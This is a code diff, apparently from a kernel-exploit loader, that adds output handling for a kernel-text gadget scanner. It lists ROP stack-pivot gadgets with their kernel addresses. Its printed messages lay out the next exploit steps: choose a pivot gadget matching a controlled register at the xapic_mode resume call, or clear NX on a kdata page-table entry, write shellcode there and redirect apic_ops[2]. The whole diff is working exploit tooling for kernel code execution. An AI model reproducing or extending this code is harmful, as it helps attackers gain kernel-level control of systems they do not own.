@@ -1152,6 +1152,78 @@ static void _kldload(void* data, size_t data_size)
         }
 
         printf("\n=== END KTEXT REDIRECT TEST ===\n");
+    } else if (magic == 0x47534341) { /* "GSCA" - gadget scanner results */
+        uint32_t total = (uint32_t)(readback[0] >> 32);
+        uint64_t ktext = readback[2];
+        uint64_t kdata = readback[1];
+
+        static const char* reg_names[] = {
+            "rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi",
+            "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"
+        };
+
+        printf("\n=== KTEXT GADGET SCANNER RESULTS ===\n");
+        printf("  kdata_base:   %#lx\n", kdata);
+        printf("  ktext_base:   %#lx\n", ktext);
+        printf("  ktext_size:   %#lx (%lu MB)\n", readback[3], readback[3] / (1024*1024));
+        printf("  sentinel:     %#lx %s\n", readback[4],
+               readback[4] == 0xdeadbeefcafe0006ULL ? "[OK]" : "[BAD]");
+        printf("  total found:  %u\n\n", total);
+
+        /* Categorize results */
+        int cat_counts[5] = {0}; /* pop, xchg, mov, push+pop, leave */
+        for (uint32_t i = 0; i < total && i < 59; i++) {
+            uint64_t addr = readback[5 + i * 2];
+            uint64_t info = readback[5 + i * 2 + 1];
+            int type = (int)(info & 0xFF);
+            int len = (int)((info >> 8) & 0xFF);
+            int reg = (int)((info >> 16) & 0xFF);
+            uint32_t raw4 = (uint32_t)(info >> 32);
+
+            if (type < 5) cat_counts[type]++;
+
+            printf("  [%2u] %#lx (ktext+%#07lx): ", i, addr, addr - ktext);
+
+            /* Print raw bytes */
+            for (int b = 0; b < len && b < 4; b++)
+                printf("%02x ", (raw4 >> (b * 8)) & 0xFF);
+
+            printf("= ");
+
+            /* Print description */
+            const char* rn = (reg < 16) ? reg_names[reg] : "?";
+            switch (type) {
+                case 0: printf("pop rsp; ret"); break;
+                case 1: printf("xchg rsp, %s; ret", rn); break;
+                case 2: printf("mov rsp, %s; ret", rn); break;
+                case 3: printf("push %s; pop rsp; ret", rn); break;
+                case 4: printf("leave; ret"); break;
+                default: printf("type=%d reg=%d", type, reg);
+            }
+            printf("\n");
+        }
+
+        printf("\n  --- Summary ---\n");
+        printf("  pop rsp; ret:            %d\n", cat_counts[0]);
+        printf("  xchg rsp, reg; ret:      %d\n", cat_counts[1]);
+        printf("  mov rsp, reg; ret:       %d\n", cat_counts[2]);
+        printf("  push reg; pop rsp; ret:  %d\n", cat_counts[3]);
+        printf("  leave; ret:              %d (capped at 5)\n", cat_counts[4]);
+
+        if (cat_counts[0] + cat_counts[1] + cat_counts[2] + cat_counts[3] > 0) {
+            printf("\n  >>> PIVOT GADGETS FOUND! <<<\n");
+            printf("  >>> Next: determine register state at xapic_mode call during resume <<<\n");
+            printf("  >>> Then pick gadget matching a register you control <<<\n");
+        } else if (cat_counts[4] > 0) {
+            printf("\n  Only leave;ret found (need RBP control).\n");
+            printf("  Consider: clear NX on kdata PTE and write shellcode instead.\n");
+        } else {
+            printf("\n  No pivot gadgets found in ktext.\n");
+            printf("  Alternative: clear NX bit on kdata page table entry,\n");
+            printf("  write shellcode to kdata, point apic_ops[2] there.\n");
+        }
+
+        printf("\n=== END GADGET SCANNER ===\n");
     } else {
         /* Generic readback - check for test markers */
         uint64_t val0 = readback[0];
